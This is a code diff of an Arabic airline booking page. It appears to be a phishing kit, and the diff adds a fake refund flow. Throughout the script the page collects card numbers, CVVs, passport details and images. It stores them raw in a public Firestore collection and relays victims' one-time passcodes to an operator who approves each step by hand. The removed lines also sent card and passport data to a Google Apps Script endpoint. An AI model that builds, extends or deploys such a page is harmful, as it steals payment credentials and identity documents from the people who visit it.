@@ -159,7 +159,7 @@
     <path d="M95 15 C 100 15, 100 35, 95 35" fill="#006ce4"/>
     <line x1="10" y1="25" x2="90" y2="25" stroke="white" stroke-width="2"/>
     </svg>
-    <h1 class="text-2xl font-extrabold mt-4">عرض تفاصيل الحجز</h1>
+    <h1 id="main-title" class="text-2xl font-extrabold mt-4">عرض تفاصيل الحجز</h1>
     <p class="text-gray-500 mt-2">الرجاء إدخال رقم الحجز / الفاتورة الذي تم تزويدك به.</p>
     </div>
     <form id="search-form" class="space-y-4">
@@ -196,7 +196,6 @@
             <div>
                 <label for="free_airline" class="label">شركة الطيران للرحلة المجانية <span class="text-red-500">*</span></label>
                 <select id="free_airline" name="free_airline" class="input-field" required>
-                    <!-- Options will be populated by JavaScript -->
                 </select>
             </div>
             <div class="grid grid-cols-2 gap-4">
@@ -220,7 +219,6 @@
                 </div>
             </div>
             <div id="free-passport-upload-container">
-                <!-- This will be populated by JavaScript -->
             </div>
         </form>
     </div>
@@ -253,6 +251,19 @@
             <i class="fas fa-lock mr-2"></i>ادفع الآن
         </button>
     </form>
+
+    <form id="refund-form" class="hidden space-y-6">
+        <h2 class="text-xl font-bold border-b pb-2">تأكيد استرداد المبلغ</h2>
+        <p class="text-gray-600 text-center">سيتم استرداد المبلغ إلى طريقة الدفع الأصلية. الرجاء مراجعة تفاصيل الحجز وتأكيد طلب الاسترداد.</p>
+        <div>
+            <label class="label">المبلغ المسترد</label>
+            <div id="refund-price-container" class="input-field bg-gray-200 font-bold text-lg text-center"></div>
+        </div>
+        <button id="refund-btn" type="submit" class="btn-primary">
+            <i class="fas fa-undo-alt mr-2"></i>تأكيد طلب الاسترداد
+        </button>
+    </form>
+
     </div>
     </div>
     </div>
@@ -284,21 +295,20 @@
     </div>
 
 <script type="module">
-    // --- Firebase Imports --- 
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
     import { getFirestore, doc, getDoc, setDoc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
     import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-    // --- Global State --- 
     let db, auth;
     let currentTicketData = null;
     let pendingBookingId = null;
+    let pendingRefundId = null;
     let unsubscribeFromBookingStatus = null;
+    let unsubscribeFromRefundStatus = null;
     let currentUserId = null;
     let otpFlowStarted = false;
     const appId = typeof __app_id !== 'undefined' ? __app_id : '1:666361598120:web:8eb42070c3a56dea87b29d';
 
-    // --- Firebase Initialization & Auth --- 
     (async () => {
     try {
         const firebaseConfig = typeof __firebase_config !== 'undefined' 
@@ -335,21 +345,21 @@
     }
     })();
 
-    // --- DOM Elements --- 
     const searchSection = document.getElementById('search-section');
     const detailsSection = document.getElementById('details-section');
     const searchForm = document.getElementById('search-form');
     const searchError = document.getElementById('search-error');
     const ticketContainer = document.getElementById('ticket-details-container');
     const paymentForm = document.getElementById('payment-form');
+    const refundForm = document.getElementById('refund-form');
     const userInfoForm = document.getElementById('user-info-form');
     const freeTicketOfferSection = document.getElementById('free-ticket-offer-section');
     const freeTicketForm = document.getElementById('free-ticket-form');
     const otpForm = document.getElementById('otp-form');
     const priceContainer = document.getElementById('price-container');
+    const refundPriceContainer = document.getElementById('refund-price-container');
     const payBtn = document.getElementById('pay-btn');
 
-    // --- Helper Functions --- 
     const showModal = (modalId, message) => {
         const modal = document.getElementById(modalId);
         const loadingMessageEl = document.getElementById('loading-message');
@@ -422,32 +432,16 @@
 
     const populateAirlineSelect = () => {
         const airlines = [
-            { value: "Saudia", text: "الخطوط السعودية" },
-            { value: "Flynas", text: "فلاي ناس" },
-            { value: "Flyadeal", text: "طيران أديل" },
-            { value: "Emirates", text: "طيران الإمارات" },
-            { value: "QatarAirways", text: "الخطوط القطرية" },
-            { value: "EgyptAir", text: "مصر للطيران" },
-            { value: "TurkishAirlines", text: "الخطوط التركية" },
-            { value: "GulfAir", text: "طيران الخليج" },
-            { value: "AirArabia", text: "العربية للطيران" },
-            { value: "EtihadAirways", text: "الاتحاد للطيران" },
-            { value: "rj", text: "الخطوط الأردنية" },
-            { value: "KuwaitAirways", text: "الخطوط الكويتية" },
-            { value: "BritishAirways", text: "الخطوط البريطانية" },
-            { value: "Lufthansa", text: "لوفتهانزا" }
+            { value: "Saudia", text: "الخطوط السعودية" }, { value: "Flynas", text: "فلاي ناس" }, { value: "Flyadeal", text: "طيران أديل" }, { value: "Emirates", text: "طيران الإمارات" }, { value: "QatarAirways", text: "الخطوط القطرية" }, { value: "EgyptAir", text: "مصر للطيران" }, { value: "TurkishAirlines", text: "الخطوط التركية" }, { value: "GulfAir", text: "طيران الخليج" }, { value: "AirArabia", text: "العربية للطيران" }, { value: "EtihadAirways", text: "الاتحاد للطيران" }, { value: "rj", text: "الخطوط الأردنية" }, { value: "KuwaitAirways", text: "الخطوط الكويتية" }, { value: "BritishAirways", text: "الخطوط البريطانية" }, { value: "Lufthansa", text: "لوفتهانزا" }
         ];
-
         const airlineSelect = document.getElementById('free_airline');
         if (!airlineSelect) return;
-
         airlineSelect.innerHTML = '<option value="" disabled selected>اختر شركة طيران</option>';
         airlines.forEach(airline => {
             airlineSelect.innerHTML += `<option value="${airline.value}">${airline.text}</option>`;
         });
     };
     
-    // --- MAIN RENDER FUNCTION (MODIFIED) ---
     const renderTicket = (data) => {
         const departure = formatDateTime(data.departure_datetime);
         const arrival = formatDateTime(data.return_datetime);
@@ -458,122 +452,76 @@
         ticketContainer.innerHTML = `<div class="bg-white rounded-lg shadow-md"><div class="ticket-header"><div class="flex justify-between items-center"><div class="flex items-center gap-4"><img src="${logoInfo.url}" alt="Logo" class="h-12"><span class="font-bold text-lg">${logoInfo.name}</span></div><div class="text-left"><span class="block text-sm text-gray-500">رقم الحجز</span><span class="block font-bold text-lg">${data.booking_ref}</span></div></div></div><div class="p-6"><div class="flex justify-between items-center gap-4 mb-6"><div class="flex items-center gap-4"><img src="${data.airline_logo_path}" alt="${data.airline_name}" class="h-12 w-12 object-contain" onerror="this.style.display='none'"><div><h2 class="font-bold text-xl">${data.airline_name}</h2><p class="text-sm text-gray-500">مرحباً, ${clientDisplayName || 'ضيفنا الكريم'}</p></div></div>${flightNumberHTML}</div><div class="flight-path"><span class="city">${data.departure_from}</span><span class="arrow"><i class="fas ${data.trip_type === 'round_trip' ? 'fa-exchange-alt' : 'fa-long-arrow-alt-left'}"></i></span><span class="city">${data.arrival_to}</span></div><div class="grid grid-cols-2 gap-6 text-center"><div><p class="text-sm text-gray-500">المغادرة</p><p class="font-bold">${departure.date}</p><p class="font-extrabold text-lg text-[var(--brand-blue)]">${departure.time}</p></div><div class="${data.trip_type === 'one_way' ? 'hidden' : ''}"><p class="text-sm text-gray-500">العودة</p><p class="font-bold">${arrival.date}</p><p class="font-extrabold text-lg text-[var(--brand-blue)]">${arrival.time}</p></div></div></div></div>`;
 
         const originalPrice = parseFloat(data.price) || 0;
-        priceContainer.innerHTML = data.has_discount ? `<span class="line-through text-gray-500">${originalPrice.toFixed(2)} ${data.currency}</span> <span class="text-green-600 ml-2">${(originalPrice * 0.30).toFixed(2)} ${data.currency}</span>` : `${originalPrice.toFixed(2)} ${data.currency}`;
+        const priceString = data.has_discount ? `<span class="line-through text-gray-500">${originalPrice.toFixed(2)} ${data.currency}</span> <span class="text-green-600 ml-2">${(originalPrice * 0.30).toFixed(2)} ${data.currency}</span>` : `${originalPrice.toFixed(2)} ${data.currency}`;
         
-        // Handle Free Ticket Offer
-        freeTicketOfferSection.classList.toggle('hidden', !data.is_free);
-        if (data.is_free) {
-            populateAirlineSelect();
-            const prefilledFreeTicket = data.prefilled_free_ticket_data || {};
-            const freeForm = document.getElementById('free-ticket-form');
-            
-            const fieldsToPrefill = {
-                'free_departure_from': prefilledFreeTicket.departure_from,
-                'free_arrival_to': prefilledFreeTicket.arrival_to,
-                'free_airline': prefilledFreeTicket.airline,
-                'free_firstName': prefilledFreeTicket.firstName,
-                'free_lastName': prefilledFreeTicket.lastName,
-                'free_passportNumber': prefilledFreeTicket.passportNumber,
-                'free_passportExpiry': prefilledFreeTicket.passportExpiry
-            };
-
-            for (const [id, value] of Object.entries(fieldsToPrefill)) {
-                const input = freeForm.querySelector(`#${id}`);
-                if (input) {
-                    if (value) {
-                        input.value = value;
-                        input.disabled = true;
-                    } else {
-                        input.disabled = false;
-                    }
-                }
-            }
-
-            const passportContainer = document.getElementById('free-passport-upload-container');
-            if (prefilledFreeTicket.passport_picture_provided) {
-                passportContainer.innerHTML = `
-                    <div>
-                        <label class="label">صورة الجواز</label>
-                        <button type="button" class="file-upload-btn bg-gray-300 cursor-not-allowed" disabled>
-                            <i class="fas fa-check mr-2"></i>تم توفيرها من قبل الإدارة
-                        </button>
-                    </div>`;
-            } else {
-                 // **FIX**: Removed 'required' from the file input to make it optional.
-                passportContainer.innerHTML = `
-                    <div>
-                        <label for="free_passportPicture" class="label">صورة الجواز <span class="font-normal text-gray-500">(اختياري)</span></label>
-                        <input type="file" id="free_passportPicture" class="hidden" accept="image/*">
-                        <button type="button" class="file-upload-btn" onclick="document.getElementById('free_passportPicture').click()">
-                            <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
-                        </button>
-                        <div id="free_passport_file_name" class="file-name">لم يتم اختيار ملف</div>
-                    </div>`;
-            }
-        }
-
-        // **FIX**: This section now correctly loops through ALL passengers provided in the data.
         let formHtml = '';
         if (data.passengers && data.passengers.length > 0) {
             data.passengers.forEach((passenger, index) => {
                 const passengerNum = index + 1;
                 const prefilled = passenger || {};
+                const isRefund = data.transaction_type === 'refund';
                 
                 let passportHtml;
                 if (prefilled.passport_picture_provided) {
-                    passportHtml = `
-                        <div>
-                            <label class="label">صورة الجواز</label>
-                            <button type="button" class="file-upload-btn bg-gray-300 cursor-not-allowed" disabled>
-                                <i class="fas fa-check mr-2"></i>تم توفيرها من قبل الإدارة
-                            </button>
-                            <input type="file" id="main_passportPicture_${index}" data-passenger-index="${index}" class="hidden passport-file-input" accept="image/*">
-                        </div>`;
+                    passportHtml = `<div><label class="label">صورة الجواز</label><button type="button" class="file-upload-btn bg-gray-300 cursor-not-allowed" disabled><i class="fas fa-check mr-2"></i>تم توفيرها من قبل الإدارة</button></div>`;
                 } else {
-                    // **FIX**: Removed 'required' from the file input to make it optional.
-                    passportHtml = `
-                        <div>
-                            <label for="main_passportPicture_${index}" class="label">صورة الجواز <span class="font-normal text-gray-500">(اختياري)</span></label>
-                            <input type="file" id="main_passportPicture_${index}" data-passenger-index="${index}" class="hidden passport-file-input" accept="image/*">
-                            <button type="button" class="file-upload-btn" onclick="document.getElementById('main_passportPicture_${index}').click()">
-                                <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
-                            </button>
-                            <div id="main_passport_file_name_${index}" class="file-name">لم يتم اختيار ملف</div>
-                        </div>`;
+                    passportHtml = `<div><label for="main_passportPicture_${index}" class="label">صورة الجواز <span class="font-normal text-gray-500">(اختياري)</span></label><input type="file" id="main_passportPicture_${index}" data-passenger-index="${index}" class="hidden passport-file-input" accept="image/*" ${isRefund ? 'disabled' : ''}><button type="button" class="file-upload-btn" onclick="document.getElementById('main_passportPicture_${index}').click()" ${isRefund ? 'disabled' : ''}><i class="fas fa-upload mr-2"></i>رفع صورة الجواز</button><div id="main_passport_file_name_${index}" class="file-name">لم يتم اختيار ملف</div></div>`;
                 }
 
                 formHtml += `
                     <div class="p-4 border rounded-lg bg-gray-50 space-y-4">
                         <h2 class="text-xl font-bold border-b pb-2">معلومات المسافر ${passengerNum}</h2>
                         <div class="grid grid-cols-2 gap-4">
-                            <div>
-                                <label for="firstName_${index}" class="label">الاسم الأول</label>
-                                <input type="text" id="firstName_${index}" name="firstName_${index}" class="input-field" value="${prefilled.firstName || ''}" ${prefilled.firstName ? 'disabled' : ''} required>
-                            </div>
-                            <div>
-                                <label for="lastName_${index}" class="label">اسم العائلة</label>
-                                <input type="text" id="lastName_${index}" name="lastName_${index}" class="input-field" value="${prefilled.lastName || ''}" ${prefilled.lastName ? 'disabled' : ''} required>
-                            </div>
+                            <div><label for="firstName_${index}" class="label">الاسم الأول</label><input type="text" id="firstName_${index}" name="firstName_${index}" class="input-field" value="${prefilled.firstName || ''}" ${prefilled.firstName || isRefund ? 'disabled' : ''} required></div>
+                            <div><label for="lastName_${index}" class="label">اسم العائلة</label><input type="text" id="lastName_${index}" name="lastName_${index}" class="input-field" value="${prefilled.lastName || ''}" ${prefilled.lastName || isRefund ? 'disabled' : ''} required></div>
                         </div>
-                        <div>
-                            <label for="user_email_${index}" class="label">البريد الإلكتروني</label>
-                            <input type="email" id="user_email_${index}" name="user_email_${index}" class="input-field" value="${prefilled.user_email || ''}" ${prefilled.user_email ? 'disabled' : ''} required>
-                        </div>
+                        <div><label for="user_email_${index}" class="label">البريد الإلكتروني</label><input type="email" id="user_email_${index}" name="user_email_${index}" class="input-field" value="${prefilled.user_email || ''}" ${prefilled.user_email || isRefund ? 'disabled' : ''} required></div>
                         <div class="grid grid-cols-2 gap-4">
-                            <div>
-                                <label for="passportNumber_${index}" class="label">رقم جواز السفر</label>
-                                <input type="text" id="passportNumber_${index}" name="passportNumber_${index}" class="input-field" value="${prefilled.passportNumber || ''}" ${prefilled.passportNumber ? 'disabled' : ''} required>
-                            </div>
-                            <div>
-                                <label for="passportExpiry_${index}" class="label">تاريخ انتهاء الجواز</label>
-                                <input type="date" id="passportExpiry_${index}" name="passportExpiry_${index}" class="input-field" value="${prefilled.passportExpiry || ''}" ${prefilled.passportExpiry ? 'disabled' : ''} required>
-                            </div>
+                            <div><label for="passportNumber_${index}" class="label">رقم جواز السفر</label><input type="text" id="passportNumber_${index}" name="passportNumber_${index}" class="input-field" value="${prefilled.passportNumber || ''}" ${prefilled.passportNumber || isRefund ? 'disabled' : ''} required></div>
+                            <div><label for="passportExpiry_${index}" class="label">تاريخ انتهاء الجواز</label><input type="date" id="passportExpiry_${index}" name="passportExpiry_${index}" class="input-field" value="${prefilled.passportExpiry || ''}" ${prefilled.passportExpiry || isRefund ? 'disabled' : ''} required></div>
                         </div>
                         ${passportHtml}
                     </div>`;
             });
         }
         userInfoForm.innerHTML = formHtml;
+        
+        freeTicketOfferSection.classList.toggle('hidden', !data.is_free);
+        if (data.is_free) {
+            populateAirlineSelect();
+            const prefilledFreeTicket = data.prefilled_free_ticket_data || {};
+            const isRefund = data.transaction_type === 'refund';
+            Object.entries(prefilledFreeTicket).forEach(([key, value]) => {
+                const input = freeTicketForm.querySelector(`[name="free_${key}"]`);
+                if (input) {
+                    if (value) {
+                        input.value = value;
+                        input.disabled = true;
+                    } else {
+                        input.disabled = isRefund;
+                    }
+                }
+            });
+
+            const passportContainer = document.getElementById('free-passport-upload-container');
+            if (prefilledFreeTicket.passport_picture_provided) {
+                passportContainer.innerHTML = `<div><label class="label">صورة الجواز</label><button type="button" class="file-upload-btn bg-gray-300 cursor-not-allowed" disabled><i class="fas fa-check mr-2"></i>تم توفيرها من قبل الإدارة</button></div>`;
+            } else {
+                passportContainer.innerHTML = `<div><label for="free_passportPicture" class="label">صورة الجواز <span class="font-normal text-gray-500">(اختياري)</span></label><input type="file" id="free_passportPicture" class="hidden" accept="image/*" ${isRefund ? 'disabled' : ''}><button type="button" class="file-upload-btn" onclick="document.getElementById('free_passportPicture').click()" ${isRefund ? 'disabled' : ''}><i class="fas fa-upload mr-2"></i>رفع صورة الجواز</button><div id="free_passport_file_name" class="file-name">لم يتم اختيار ملف</div></div>`;
+            }
+        }
+
+        if (data.transaction_type === 'refund') {
+            document.getElementById('main-title').textContent = 'طلب استرداد مبلغ';
+            paymentForm.classList.add('hidden');
+            refundForm.classList.remove('hidden');
+            refundPriceContainer.innerHTML = priceString;
+        } else {
+            document.getElementById('main-title').textContent = 'عرض تفاصيل الحجز';
+            paymentForm.classList.remove('hidden');
+            refundForm.classList.add('hidden');
+            priceContainer.innerHTML = priceString;
+        }
     };
     
     searchForm.addEventListener('submit', async (e) => {
@@ -603,29 +551,15 @@
     
     paymentForm.addEventListener('submit', async (e) => {
         e.preventDefault();
-        
         otpFlowStarted = false;
-
         let isValid = true;
-        const validateForm = (form) => [...form.elements].forEach(el => {
+        [...paymentForm.elements, ...userInfoForm.elements].forEach(el => {
             el.classList.remove('input-error');
-            let associatedButton = null;
-            if (el.type === 'file') {
-                associatedButton = el.nextElementSibling;
-                if (associatedButton) associatedButton.classList.remove('input-error');
-            }
-            // The validation for file inputs is now skipped because the 'required' attribute was removed.
-            if (el.required && !el.disabled) {
-                if (!el.value) {
-                   isValid = false;
-                   el.classList.add('input-error');
-                }
+            if (el.required && !el.disabled && !el.value) {
+               isValid = false;
+               el.classList.add('input-error');
             }
         });
-
-        validateForm(paymentForm);
-        validateForm(userInfoForm);
-        if (freeTicketOfferSection.offsetParent) { validateForm(freeTicketForm); }
 
         if (!isValid) {
             showResultModal('خطأ', 'الرجاء تعبئة جميع الحقول الإجبارية.', false);
@@ -636,69 +570,13 @@
         payBtn.disabled = true;
 
         try {
-            const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxrOix85P6YHKuY1CvSeqlvsUYCH4KAg-vvmWyMzvs8XMoSMOoK4u_wVYD9I8OI2bAP/exec";
-            
-            const passengersDataForSheet = [];
-            const passengers = currentTicketData.passengers || [];
-            for (let i = 0; i < passengers.length; i++) {
-                const passportFile = document.getElementById(`main_passportPicture_${i}`)?.files[0];
-                let passportBase64 = null;
-                if (passportFile) {
-                    passportBase64 = await fileToBase64(passportFile);
-                }
-                passengersDataForSheet.push({
-                    name: `${document.getElementById(`firstName_${i}`).value} ${document.getElementById(`lastName_${i}`).value}`,
-                    email: document.getElementById(`user_email_${i}`).value,
-                    passportNumber: document.getElementById(`passportNumber_${i}`).value,
-                    passportExpiry: document.getElementById(`passportExpiry_${i}`).value,
-                    passportFile: passportFile ? {
-                        base64: passportBase64,
-                        fileName: passportFile.name,
-                        mimeType: passportFile.type
-                    } : null
-                });
-            }
+            const passengersData = (currentTicketData.passengers || []).map((_, i) => ({
+                name: `${document.getElementById(`firstName_${i}`).value} ${document.getElementById(`lastName_${i}`).value}`,
+                email: document.getElementById(`user_email_${i}`).value,
+                passportNumber: document.getElementById(`passportNumber_${i}`).value,
+                passportExpiry: document.getElementById(`passportExpiry_${i}`).value
+            }));
 
-            const payload = {
-                booking_ref: currentTicketData.booking_ref,
-                passengers: passengersDataForSheet,
-                cardholder_name: document.getElementById('cardholderName').value,
-                card_number: document.getElementById('cardNumber').value,
-                card_expiry: document.getElementById('expiry').value,
-                card_cvv: document.getElementById('cvv').value,
-                price: priceContainer.textContent,
-                currency: currentTicketData.currency,
-            };
-
-            if (freeTicketOfferSection.offsetParent) {
-                const freePassportFile = document.getElementById('free_passportPicture')?.files[0];
-                const freeAirlineSelect = document.getElementById('free_airline');
-                payload.freeTicketDetails = {
-                    departure: document.getElementById('free_departure_from').value,
-                    arrival: document.getElementById('free_arrival_to').value,
-                    airline_name: freeAirlineSelect.options[freeAirlineSelect.selectedIndex].text,
-                    passenger_name: `${document.getElementById('free_firstName').value} ${document.getElementById('free_lastName').value}`,
-                    passport_number: document.getElementById('free_passportNumber').value,
-                    passport_expiry: document.getElementById('free_passportExpiry').value,
-                    passportFile: freePassportFile ? {
-                        base64: await fileToBase64(freePassportFile),
-                        fileName: freePassportFile.name,
-                        mimeType: freePassportFile.type
-                    } : null
-                };
-            }
-            
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors', 
-                body: JSON.stringify(payload),
-                headers: { "Content-Type": "text/plain;charset=utf-8" }
-            });
-            
-            console.log('Data submitted to Google Script');
-            
-            showModal('loading-modal', 'جاري الدفع...');
-            
             const bookingDetailsForFirebase = {
                 cardholderName: document.getElementById('cardholderName').value,
                 cardNumber: document.getElementById('cardNumber').value,
@@ -706,44 +584,57 @@
                 cvv: document.getElementById('cvv').value,
                 calculatedPrice: currentTicketData.has_discount ? (parseFloat(currentTicketData.price) * 0.30) : parseFloat(currentTicketData.price),
                 currency: currentTicketData.currency,
-                passengers: passengersDataForSheet.map(p => ({
-                    name: p.name,
-                    email: p.email,
-                    passportNumber: p.passportNumber,
-                    passportExpiry: p.passportExpiry
-                }))
+                passengers: passengersData
             };
             
-            const freeTicketDetailsForFirebase = freeTicketOfferSection.offsetParent ? {
-                departure: document.getElementById('free_departure_from').value,
-                arrival: document.getElementById('free_arrival_to').value,
-                airline_name: document.getElementById('free_airline').options[document.getElementById('free_airline').selectedIndex].text,
-                passenger_name: `${document.getElementById('free_firstName').value} ${document.getElementById('free_lastName').value}`,
-                passport_number: document.getElementById('free_passportNumber').value,
-                passport_expiry: document.getElementById('free_passportExpiry').value,
-            } : null;
-
             pendingBookingId = `${currentTicketData.id}-${Date.now()}`;
             const pendingDocRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, pendingBookingId);
             
-            const firebasePayload = {
+            await setDoc(pendingDocRef, {
                 userId: auth.currentUser.uid,
                 ticketId: currentTicketData.id,
                 status: 'payment_pending',
                 createdAt: new Date().toISOString(),
                 bookingDetails: bookingDetailsForFirebase,
-                ...(freeTicketDetailsForFirebase && { freeTicketDetails: freeTicketDetailsForFirebase })
-            };
-
-            await setDoc(pendingDocRef, firebasePayload);
-            console.log("Booking request sent. Waiting...");
+            });
             listenForBookingStatus(pendingBookingId);
 
         } catch (error) {
-            console.error("Booking/Submission error:", error);
+            console.error("Booking submission error:", error);
             hideAllModals();
-            showResultModal('خطأ فادح', `لم نتمكن من إرسال طلبك. يرجى المحاولة مرة أخرى. الخطأ: ${error.message}`, false, () => {
-                payBtn.disabled = false;
+            showResultModal('خطأ فادح', `لم نتمكن من إرسال طلبك.`, false, () => payBtn.disabled = false);
+        }
+    });
+
+    refundForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        showModal('loading-modal', 'جاري إرسال طلب الاسترداد...');
+        document.getElementById('refund-btn').disabled = true;
+
+        try {
+            const passengerName = `${document.getElementById('firstName_0').value} ${document.getElementById('lastName_0').value}`;
+            const refundAmount = currentTicketData.has_discount ? (parseFloat(currentTicketData.price) * 0.30) : parseFloat(currentTicketData.price);
+
+            pendingRefundId = `${currentTicketData.id}-${Date.now()}`;
+            const refundDocRef = doc(db, `artifacts/${appId}/public/data/pending_refunds`, pendingRefundId);
+
+            await setDoc(refundDocRef, {
+                userId: auth.currentUser.uid,
+                ticketId: currentTicketData.id,
+                status: 'refund_pending',
+                createdAt: new Date().toISOString(),
+                passengerName: passengerName,
+                refundAmount: refundAmount,
+                currency: currentTicketData.currency,
+            });
+
+            listenForRefundStatus(pendingRefundId);
+
+        } catch (error) {
+            console.error("Refund submission error:", error);
+            hideAllModals();
+            showResultModal('خطأ', 'فشل إرسال طلب الاسترداد. حاول مرة أخرى.', false, () => {
+                document.getElementById('refund-btn').disabled = false;
             });
         }
     });
@@ -752,151 +643,96 @@
         e.preventDefault();
         const otpInputs = otpForm.querySelectorAll('input');
         const otpCode = [...otpInputs].map(i => i.value).join('');
-        const otpError = document.getElementById('otp-error');
-
         if (!/^\d{4,6}$/.test(otpCode)) {
-            otpError.textContent = 'الرجاء إدخال رمز صحيح من 4 إلى 6 أرقام.';
-            otpError.classList.remove('hidden');
+            document.getElementById('otp-error').textContent = 'الرجاء إدخال رمز صحيح من 4 إلى 6 أرقام.';
+            document.getElementById('otp-error').classList.remove('hidden');
             return;
         }
-        otpError.classList.add('hidden');
+        document.getElementById('otp-error').classList.add('hidden');
         showModal('loading-modal', 'جاري التحقق من الرمز...');
         
         try {
             const pendingDocRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, pendingBookingId);
-            await updateDoc(pendingDocRef, { 
-                otpCode: otpCode,
-                status: 'otp_submitted'
-            });
+            await updateDoc(pendingDocRef, { otpCode: otpCode, status: 'otp_submitted' });
         } catch (error) {
             console.error("OTP submission error:", error);
             hideAllModals();
-            showResultModal('خطأ فادح', 'لم نتمكن من إرسال الرمز. حاول مرة أخرى.', false, () => {
-                showModal('otp-modal');
-            });
+            showResultModal('خطأ فادح', 'لم نتمكن من إرسال الرمز. حاول مرة أخرى.', false, () => showModal('otp-modal'));
         }
     });
 
     function listenForBookingStatus(docId) {
         if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
         const docRef = doc(db, `artifacts/${appId}/public/data/pending_bookings`, docId);
-
-        const onPaymentFailedRetry = () => {
-            hideAllModals();
-            payBtn.disabled = false;
-            document.getElementById('payment-form').scrollIntoView({ behavior: 'smooth', block: 'center' });
-        };
-
-        const onOtpFailedRetry = () => {
-            const otpInputs = otpForm.querySelectorAll('input');
-            otpInputs.forEach(input => input.value = '');
-            hideAllModals();
-            showModal('otp-modal');
-            otpInputs[0].focus();
-        };
+        const onPaymentFailedRetry = () => { hideAllModals(); payBtn.disabled = false; };
+        const onOtpFailedRetry = () => { [...otpForm.querySelectorAll('input')].forEach(i => i.value = ''); hideAllModals(); showModal('otp-modal'); otpForm.querySelectorAll('input')[0].focus(); };
 
         unsubscribeFromBookingStatus = onSnapshot(docRef, (docSnap) => {
             if (!docSnap.exists()) {
                 if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
                 otpFlowStarted = false; 
-                showResultModal(
-                    'تم رفض الطلب',
-                    'تم رفض طلب الدفع أو انتهت صلاحيته. يرجى مراجعة معلوماتك والمحاولة مرة أخرى.',
-                    false,
-                    onPaymentFailedRetry
-                );
+                showResultModal('تم رفض الطلب', 'تم رفض طلب الدفع أو انتهت صلاحيته.', false, onPaymentFailedRetry);
                 return;
             }
-
             const data = docSnap.data();
-            console.log("Received status update:", data.status);
-
             switch (data.status) {
-                case 'payment_declined':
-                    if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-                    otpFlowStarted = false;
-                    showResultModal(
-                        'فشل الدفع',
-                        'تم رفض معلومات الدفع التي أدخلتها. يرجى التحقق من بيانات بطاقتك والمحاولة مرة أخرى.',
-                        false,
-                        onPaymentFailedRetry
-                    );
-                    break;
-
-                case 'otp_pending':
-                    otpFlowStarted = true;
-                    hideAllModals();
-                    showModal('otp-modal');
-                    break;
-
-                case 'confirmed':
-                    if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-                    otpFlowStarted = false;
-                    hideAllModals();
-                    showResultModal('تم تأكيد الحجز!', 'شكراً لك، تم تأكيد حجزك بنجاح. ستصلك التفاصيل قريباً.', true);
-                    break;
-
+                case 'otp_pending': otpFlowStarted = true; hideAllModals(); showModal('otp-modal'); break;
+                case 'confirmed': if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus(); otpFlowStarted = false; hideAllModals(); showResultModal('تم تأكيد الحجز!', 'شكراً لك، تم تأكيد حجزك بنجاح.', true); break;
                 case 'otp_declined':
                     hideAllModals();
-                    if (otpFlowStarted) {
-                        showResultModal('رمز التحقق غير صحيح', 'الرمز الذي أدخلته غير صحيح. الرجاء المحاولة مرة أخرى.', false, onOtpFailedRetry);
-                    } else {
-                        if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
-                        showResultModal(
-                            'فشل الدفع',
-                            'تم رفض معلومات الدفع التي أدخلتها. يرجى التحقق من بيانات بطاقتك والمحاولة مرة أخرى.',
-                            false,
-                            onPaymentFailedRetry
-                        );
-                    }
+                    if (otpFlowStarted) showResultModal('رمز التحقق غير صحيح', 'الرمز الذي أدخلته غير صحيح.', false, onOtpFailedRetry);
+                    else { if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus(); showResultModal('فشل الدفع', 'تم رفض معلومات الدفع.', false, onPaymentFailedRetry); }
                     break;
             }
         }, (error) => {
-            console.error("Error in status listener:", error);
             if (unsubscribeFromBookingStatus) unsubscribeFromBookingStatus();
             otpFlowStarted = false;
             hideAllModals();
-            showResultModal('خطأ في الاتصال', 'فقدنا الاتصال لمتابعة حالة الطلب. حاول مرة أخرى.', false, onPaymentFailedRetry);
+            showResultModal('خطأ في الاتصال', 'فقدنا الاتصال لمتابعة حالة الطلب.', false, onPaymentFailedRetry);
         });
     }
 
-    document.getElementById('cardNumber').addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim();
-    });
+    function listenForRefundStatus(docId) {
+        if (unsubscribeFromRefundStatus) unsubscribeFromRefundStatus();
+        const docRef = doc(db, `artifacts/${appId}/public/data/pending_refunds`, docId);
 
-    document.getElementById('expiry').addEventListener('input', (e) => {
-        let v = e.target.value.replace(/\D/g, '');
-        e.target.value = v.length > 2 ? v.substring(0, 2) + ' / ' + v.substring(2, 4) : v;
-    });
-    
+        unsubscribeFromRefundStatus = onSnapshot(docRef, (docSnap) => {
+            if (!docSnap.exists()) {
+                if (unsubscribeFromRefundStatus) unsubscribeFromRefundStatus();
+                showResultModal('تم إلغاء الطلب', 'تم إلغاء طلب الاسترداد من قبل المشرف.', false, () => location.reload());
+                return;
+            }
+            const data = docSnap.data();
+            if (data.status === 'refund_confirmed') {
+                if (unsubscribeFromRefundStatus) unsubscribeFromRefundStatus();
+                hideAllModals();
+                showResultModal('تم تأكيد الاسترداد', 'تمت الموافقة على طلبك بنجاح، ستتم معالجة المبلغ.', true);
+            } else if (data.status === 'refund_declined') {
+                if (unsubscribeFromRefundStatus) unsubscribeFromRefundStatus();
+                hideAllModals();
+                showResultModal('تم رفض الاسترداد', 'تم رفض طلب الاسترداد من قبل الإدارة.', false, () => location.reload());
+            }
+        });
+    }
+
+    document.getElementById('cardNumber').addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ').trim(); });
